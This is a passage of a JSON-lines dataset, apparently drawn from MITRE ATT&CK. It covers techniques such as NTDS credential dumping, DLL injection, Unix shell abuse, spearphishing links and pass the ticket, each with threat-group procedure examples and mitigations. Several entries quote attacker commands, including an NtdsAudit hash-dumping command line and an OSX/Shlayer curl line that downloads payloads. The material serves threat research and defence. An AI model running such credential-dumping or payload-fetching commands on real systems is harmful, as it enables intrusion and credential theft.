has used Metasploit’s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database.\t", "menuPass has used Ntdsutil to dump credentials.", "SecretsDump and Mimikatz modules within Impacket can perform credential dumping to obtain account and password information from NTDS.dit.", "HAFNIUM has stolen copies of the Active Directory database (NTDS.DIT).", "Dragonfly 2.0 dropped and executed SecretsDump to dump password hashes. They also obtained ntds.dit from domain controllers. ", "APT28 has used the ntdsutil.exe utility to export the Active Directory database for credential access.", "Wizard Spider has gained access to credentials via exported copies of the ntds.dit Active Directory database.", "esentutl can use Volume Shadow Copy to copy locked files such as ntds.dit.", "Chimera has gathered the SYSTEM registry and ntds.dit files from target systems. Chimera specifically has used the NtdsAudit tool to dump the password hashes of domain users via <code>cmsadcs.exe \"NTDS.dit\" -s \"SYSTEM\" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv</code> and used ntdsutil to copy the Active Directory database.", "Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers."], "is_subtechnique": true}
{"text": " Adversaries may install an older version of the operating system of a network device to weaken security. Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. (Citation: Cisco Synful Knock Evolution) On embedded devices, downgrading the version typically only requires replacing the operating system file in storage. With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart. The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts. Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as [Weaken Encryption](https://attack.mitre.org/techniques/T1600). Downgrading of a system image can be done on its own, or it can be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001).", "idx": "https://attack.mitre.org/techniques/T1601/002", "title": "Downgrade System Image", "entity": "Downgrade System Image", "entity_type": "techniques", "entity_context": ["Many vendors provide digitally signed operating system images to validate the integrity of the software used on their platform.  Make use of this feature where possible in order to prevent and/or detect attempts by adversaries to compromise the system image. ", "Refer to NIST guidelines when creating password policies.  ", "Some embedded network devices are capable of storing passwords for local accounts in either plain-text or encrypted formats.  Ensure that, where available, local passwords are always encrypted, per vendor recommendations. ", "Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints.", "Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control.", "Some vendors of embedded network devices provide cryptographic signing to ensure the integrity of operating system images at boot time.  Implement where available, following vendor guidelines. "], "is_subtechnique": true}
{"text": " Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges. Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems. Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.", "idx": "https://attack.mitre.org/techniques/T1059/004", "title": "Unix Shell", "entity": "Unix Shell", "entity_type": "techniques", "entity_context": ["Drovorub can execute arbitrary commands as root on a compromised system.", "OSX_OCEANLOTUS.D uses a shell script as the main executable inside an app bundle and drops an embedded base64-encoded payload to the <code>/tmp</code> folder.", "XCSSET uses a shell script to execute Mach-o files and <code>osacompile</code> commands such as, <code>osacompile -x -o xcode.app main.applescript</code>.", "Penquin can execute remote commands using bash scripts.", "APT41 executed <code>file /bin/pwd</code> in activity exploiting CVE-2019-19781 against Citrix devices.", "Use application control where appropriate.", "Rocke used shell scripts to run commands which would obtain persistence and execute the cryptocurrency mining malware.\t", "WindTail can use the <code>open</code> command to execute an application.", "Proton uses macOS' .command file type to script actions.", "CookieMiner has used a Unix shell script to run a series of commands targeting macOS.", "Kobalos can spawn a new pseudo-terminal and execute arbitrary commands at the command prompt. ", "NETWIRE has the ability to use <code>/bin/bash</code> and <code>/bin/sh</code> to execute commands.", "Derusbi is capable of creating a remote Bash shell and executing commands.", "Kinsing has used Unix shell scripts to execute commands in the victim environment.", "TeamTNT has used shell scripts for execution.", "Kazuar uses /bin/bash to execute commands on the victim’s machine.", "Turian has the ability to use <code>/bin/sh</code> to execute commands.", "LoudMiner used shell scripts to launch various services and to start/stop the QEMU virtualization.\t", "AppleJeus has used shell scripts to execute commands after installation and set persistence mechanisms.", "Doki has executed shell scripts with /bin/sh.", "Hildegard has used shell scripts for execution.", "Skidmap has used <code>pm.sh</code> to download and install its main payload.", "Bundlore has leveraged /bin/sh and /bin/bash to execute commands on the victim machine.", "Exaramel for Linux has a command to execute a shell command on the system.", "Chaos provides a reverse shell connection on 8338/TCP, encrypted via AES.", "Fysbis has the ability to create and execute commands in a remote shell for CLI.", "Anchor can execute payloads via shell scripting.", "CoinTicker executes a bash script to establish a reverse shell.", "OSX/Shlayer can use bash scripts to check the macOS version, download payloads, and extract bytes from files. OSX/Shlayer uses the command <code>sh -c tail -c +1381...</code> to extract bytes at an offset from a specified file. OSX/Shlayer uses the <code>curl -fsL \"$url\" >$tmp_path</code> command to download malicious payloads into a temporary directory.", "CallMe has the capability to create a reverse shell on victims."], "is_subtechnique": true}
{"text": " Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.", "idx": "https://attack.mitre.org/techniques/T1069", "title": "Permission Groups Discovery", "entity": "Permission Groups Discovery", "entity_type": "techniques", "entity_context": ["Carbon uses the <code>net group</code> command.", "MURKYTOP has the capability to retrieve information about groups.", "APT3 has a tool that can enumerate the permissions associated with Windows groups.", "APT29 used the <code>Get-ManagementRoleAssignment</code> PowerShell cmdlet to enumerate Exchange management role assignments through an Exchange Management Shell.", "ShimRatReporter gathered the local privileges for the infected host.", "Siloscape checks for Kubernetes node permissions.", "IcedID has the ability to identify Workgroup membership.", "TA505 has used TinyMet to enumerate members of privileged groups. TA505 has also run <code>net group /domain</code>.", "TrickBot can identify the groups the user on a compromised host belongs to."], "is_subtechnique": false}
{"text": " Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process. DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.", "idx": "https://attack.mitre.org/techniques/T1055/001", "title": "Dynamic-link Library Injection", "entity": "Dynamic-link Library Injection", "entity_type": "techniques", "entity_context": ["SDBbot has the ability to inject a downloaded DLL into a newly created rundll32.exe process.", "The Netwalker DLL has been injected reflectively into the memory of a legitimate running process.\t", "Cobalt Strike has the ability to load DLLs via reflective injection.", "Taidoor can perform DLL loading.", "TA505 has been seen injecting a DLL into winword.exe.", "MegaCortex loads <code>injecthelper.dll</code> into a newly created <code>rundll32.exe</code> process.", "Emotet has been observed injecting in to Explorer.exe and other processes. ", "Socksbot creates a suspended svchost process and injects its DLL into it.", "Matryoshka uses reflective DLL injection to inject the malicious library and execute the RAT.", "Conti has loaded an encrypted DLL into memory and then executes it.", "Sykipot injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.", "Carbon has a command to inject code into a process.", "Duqu will inject itself into different processes to evade detection. The selection of the target process is influenced by the security software that is installed on the system (Duqu will inject into different processes depending on which security suite is installed on the infected host).", "PS1 can inject its payload DLL Into memory.", "Aria-body has the ability to inject itself into another process such as rundll32.exe and dllhost.exe.", "Leviathan has utilized techniques like reflective DLL loading to write a DLL into memory and load a shell that provides backdoor access to the victim.", "If running in a Windows environment, Kazuar saves a DLL to disk that is injected into the explorer.exe process to execute the payload. Kazuar can also be configured to inject and execute within specific processes.", "HIDEDRV injects a DLL for Downdelph into the explorer.exe process.", "TajMahal has the ability to inject DLLs for malicious plugins into running processes.", "Emissary injects its DLL file into a newly spawned Internet Explorer process.", "PipeMon can inject its modules into various processes using reflective DLL loading.", "PowerSploit contains a collection of CodeExecution modules that inject code (DLL, shellcode) into a process.", "An executable dropped onto victims by Putter Panda aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).", "Remsec can perform DLL injection.", "Ramsay can use <code>ImprovedReflectiveDLLInjection</code> to deploy components. ", "Wizard Spider has injected malicious DLLs into memory with read, write, and execute permissions.", "SombRAT can execute <code>loadfromfile</code>, <code>loadfromstorage</code>, and <code>loadfrommem</code> to inject a DLL  from disk, storage, or memory respectively.", "Derusbi injects itself into the secure shell (SSH) process.", "FinFisher injects itself into various processes depending on whether it is low integrity or high integrity.", "BackdoorDiplomacy has dropped legitimate software onto a compromised host and used it to execute malicious DLLs.", "After decrypting itself in memory, RARSTONE downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This “downloaded” file is actually not dropped onto the system.", "Koadic can perform process injection by using a reflective DLL.", "ComRAT has injected its orchestrator DLL into explorer.exe. ComRAT has also injected its communications module into the victim's default browser to make C2 connections appear less suspicious as all network connections will be initiated by the browser process.", "Maze has injected the malware DLL into a target process.\t", "Stuxnet injects an entire DLL into an existing, newly created, or preselected trusted process.", "Tropic Trooper has injected a DLL backdoor into dllhost.exe and svchost.exe.", "Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. ", "Pupy can migrate into another process using reflective DLL injection.", "A Lazarus Group malware sample performs reflective DLL injection.", "Dyre injects into other processes to load modules.", "Carberp's bootkit can inject a malicious DLL into the address space of running processes.", "Elise injects DLL files into iexplore.exe.", "ShadowPad has injected a DLL into svchost.exe.", "Get2 has the ability to inject DLLs into processes.", "IronNetInjector has the ability to inject a DLL into running processes, including the IronNetInjector DLL into explorer.exe.", "BlackEnergy injects its DLL component into svchost.exe.", "Turla has used Metasploit to perform reflective DLL injection in order to escalate privileges.", "RATANKBA performs a reflective DLL injection using a given pid.", "PoisonIvy can inject a malicious DLL into a process.", "Metamorfo has injected a malicious DLL into the Windows Media Player process (wmplayer.exe).", "ZxShell is injected into a shared SVCHOST process. "], "is_subtechnique": true}
{"text": " Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man) Adversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w \"%s/Library/LaunchAgents/%s\"</code> or <code>/bin/launchctl load</code> to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques)", "idx": "https://attack.mitre.org/techniques/T1569/001", "title": "Launchctl", "entity": "Launchctl", "entity_type": "techniques", "entity_context": ["XCSSET loads a system level launchdaemon using the <code>launchctl load -w</code> command from <code>/System/Librarby/LaunchDaemons/ssh.plist</code>.", "LoudMiner launched the QEMU services in the <code>/Library/LaunchDaemons/</code> folder using <code>launchctl</code>. It also uses <code>launchctl</code> to unload all Launch Daemons when updating to a newer version of LoudMiner.\t", "AppleJeus has loaded a plist file using the <code>launchctl</code> command.", "Calisto uses launchctl to enable screen sharing on the victim’s machine.", "Prevent users from installing their own launch agents or launch daemons."], "is_subtechnique": true}
{"text": " Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.(Citation: Exploit Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying) In addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation: Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).(Citation: TempertonDarkHotel) An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation. Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).", "idx": "https://attack.mitre.org/techniques/T1588/005", "title": "Exploits", "entity": "Exploits", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": true}
{"text": " Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers. Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: [WHOIS](https://attack.mitre.org/techniques/T1596/002)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).", "idx": "https://attack.mitre.org/techniques/T1590/001", "title": "Domain Properties", "entity": "Domain Properties", "entity_type": "techniques", "entity_context": ["Sandworm Team conducted technical reconnaissance of the Parliament of Georgia's official internet domain prior to its 2019 attack.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).", "idx": "https://attack.mitre.org/techniques/T1056", "title": "Input Capture", "entity": "Input Capture", "entity_type": "techniques", "entity_context": ["APT39 has utilized tools to capture mouse movements.", "Chaes has a module to perform any API hooking it desires. ", "Kobalos has used a compromised SSH client to capture the hostname, port, username and password used to establish an SSH connection from the compromised host. "], "is_subtechnique": false}
{"text": " Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017) Unlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signature.", "idx": "https://attack.mitre.org/techniques/T1036/001", "title": "Invalid Code Signature", "entity": "Invalid Code Signature", "entity_type": "techniques", "entity_context": ["The NETWIRE client has been signed by fake and invalid digital certificates.", "Regin stage 1 modules for 64-bit systems have been found to be signed with fake certificates masquerading as originating from Microsoft Corporation and Broadcom Corporation.", "WindTail has been incompletely signed with revoked certificates.", "Windshift has used revoked certificates to sign malware.", "Require signed binaries.", "BADNEWS is sometimes signed with an invalid Authenticode certificate in an apparent effort to make it look more legitimate.", "APT37 has signed its malware with an invalid digital certificates listed as “Tencent Technology (Shenzhen) Company Limited.”"], "is_subtechnique": true}
{"text": " Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004) or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may compromise third-party servers in support of operations. Adversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).", "idx": "https://attack.mitre.org/techniques/T1584/004", "title": "Server", "entity": "Server", "entity_type": "techniques", "entity_context": ["APT16 has compromised otherwise legitimate sites as staging servers for second-stage payloads.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "Indrik Spider has served fake updates via legitimate websites that have been compromised.\t", "Turla has used compromised servers as infrastructure."], "is_subtechnique": true}
{"text": " Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location. Adversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.(Citation: SSLShopper Lookup) Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).(Citation: Medium SSL Cert) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).", "idx": "https://attack.mitre.org/techniques/T1596/003", "title": "Digital Certificates", "entity": "Digital Certificates", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)", "idx": "https://attack.mitre.org/techniques/T1566/002", "title": "Spearphishing Link", "entity": "Spearphishing Link", "entity_type": "techniques", "entity_context": ["APT1 has sent spearphishing emails containing hyperlinks to malicious files.", "OilRig has sent spearphising emails with malicious links to potential victims.", "APT32 has sent spearphishing emails containing malicious links.", "Evilnum has sent spearphishing emails containing a link to a zip file hosted on Google Drive.", "APT29 has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.", "Mustang Panda has delivered spearphishing links to their target.", "FIN8 has distributed targeted emails containing links to malicious documents with embedded macros.", "Emotet has been delivered by phishing emails containing links. ", "Turla attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.", "Melcoz has been spread through malicious links embedded in e-mails.", "Windshift has sent spearphishing emails with links to harvest credentials and deliver malware.", "Molerats has sent phishing emails with malicious links included.", "Hancitor has been delivered via phishing emails which contained malicious links.", "APT33 has sent spearphishing emails containing links to .hta files.", "Cobalt Group has sent emails with URLs pointing to malicious documents.", "Bazar has been spread via emails with embedded malicious links.", "ZIRCONIUM has used malicious links and web beacons in e-mails for malware download and to track hits to attacker-controlled URL's.", "Patchwork has used spearphishing with links to deliver files with exploits to initial victims. The group has also used embedded image tags (known as web bugs) with unique, per-recipient tracking links in their emails for the purpose of identifying which recipients opened messages.", "FIN7 has conducted broad phishing campaigns using malicious links.", "Kimsuky has sent spearphishing emails containing a link to a document that contained malicious macros or took the victim to an actor-controlled domain.", "Night Dragon sent spearphishing emails containing links to compromised websites where malware was downloaded.", "Machete has sent phishing emails that contain a link to an external server with ZIP and RAR archives.", "GuLoader has been spread in phishing campaigns using malicious web links.", "Wizard Spider has sent phishing emails containing a link to an actor-controlled Google Drive document or other free online file hosting services.", "APT28 sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.", "Transparent Tribe has embedded links to malicious downloads in e-mails.", "Determine if certain websites that can be used for spearphishing are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk.", "TrickBot has been delivered via malicious links in phishing e-mails.", "Valak has been delivered via malicious links in e-mail.", "NETWIRE has been spread via e-mail campaigns utilizing malicious links.", "FIN4 has used spearphishing emails (often sent from compromised accounts) containing malicious links.", "Dragonfly 2.0 used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites.", "QakBot has spread through emails with malicious links.\n", "TA505 has sent spearphishing emails containing malicious links.", "Mofang delivered spearphishing emails with malicious links included.", "APT3 has sent spearphishing emails containing malicious links.", "AppleJeus has been distributed via spearphishing link.", "SpicyOmelette has been distributed via emails containing a malicious link that appears to be a PDF document.", "Leviathan has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.", "Kerrdown has been distributed via e-mails containing a malicious link.", "Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation.", "Javali has been delivered via malicious links embedded in e-mails.", "Grandoreiro has been spread via malicious links embedded in e-mails.", "Elderwood has delivered zero-day exploits and malware to victims via targeted emails containing a link to malicious content hosted on an uncommon Web server.", "Magic Hound has sent malicious URL links through email to victims. In some cases the URLs were shortened or linked to Word documents with malicious macros that executed PowerShells scripts to download Pupy.", "Pony has been delivered via spearphishing emails which contained malicious links.\t", "APT39 leveraged spearphishing emails with malicious links to initially compromise victims.", "Users can be trained to identify social engineering techniques and spearphishing emails with malicious links.", "MuddyWater has sent targeted spearphishing e-mails with malicious links.", "Sidewinder has sent e-mails with malicious links often crafted for specific targets.", "BlackTech has used spearphishing e-mails with links to cloud services to deliver malware.", "Sandworm Team has crafted phishing emails containing malicious hyperlinks."], "is_subtechnique": true}
{"text": " Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020) Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file in not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020) Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)", "idx": "https://attack.mitre.org/techniques/T1553/005", "title": "Mark-of-the-Web Bypass", "entity": "Mark-of-the-Web Bypass", "entity_type": "techniques", "entity_context": ["Consider blocking container file types at web and/or email gateways. Consider unregistering container file extensions in Windows File Explorer.", "TA505 has used .iso files to deploy malicious .lnk files."], "is_subtechnique": true}
{"text": " Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system. When preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket) A [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks) A [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014) Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create", "idx": "https://attack.mitre.org/techniques/T1550/003", "title": "Pass the Ticket", "entity": "Pass the Ticket", "entity_type": "techniques", "entity_context": ["Ensure that local administrator accounts have complex, unique passwords.", "Mimikatz’s <code>LSADUMP::DCSync</code> and <code>KERBEROS::PTT</code> modules implement the three steps required to extract the krbtgt account hash and create/use Kerberos tickets.", "To contain the impact of a previously generated golden ticket, reset the built-in KRBTGT account password twice, which will invalidate any existing golden tickets that have been created with the KRBTGT hash and other Kerberos tickets derived from it. For each domain, change the KRBTGT account password once, force replication, and then change the password a second time. Consider rotating the KRBTGT account password every 180 days.", "Do not allow a user to be a local administrator for multiple systems.", "Limit domain admin account permissions to domain controllers and limited servers. Delegate other admin functions to separate accounts.", "APT29 used Kerberos ticket attacks for lateral movement.", "APT32 successfully gained remote access by using pass the ticket.", "Some SeaDuke samples have a module to use pass the ticket with Kerberos for authentication.", "BRONZE BUTLER has created forged Kerberos Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) tickets to maintain administrative access.", "Pupy can also perform pass-the-ticket."], "is_subtechnique": true}
{"text": " Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP). The MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details. Adversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)", "idx": "https://attack.mitre.org/techniques/T1602/001", "title": "SNMP (MIB Dump)", "entity": "SNMP (MIB Dump)", "entity_type": "techniques", "entity_context": ["Apply extended ACLs to block unauthorized protocols outside the trusted network.", "Configure SNMPv3 to use the highest level of security (authPriv) available.", "Allowlist MIB objects and implement SNMP views.", "Keep system images and software updated and migrate to SNMPv3.", "Segregate SNMP traffic on a separate management network.", "Configure intrusion prevention devices to detect SNMP queries and commands from unauthorized sources."], "is_subtechnique": true}
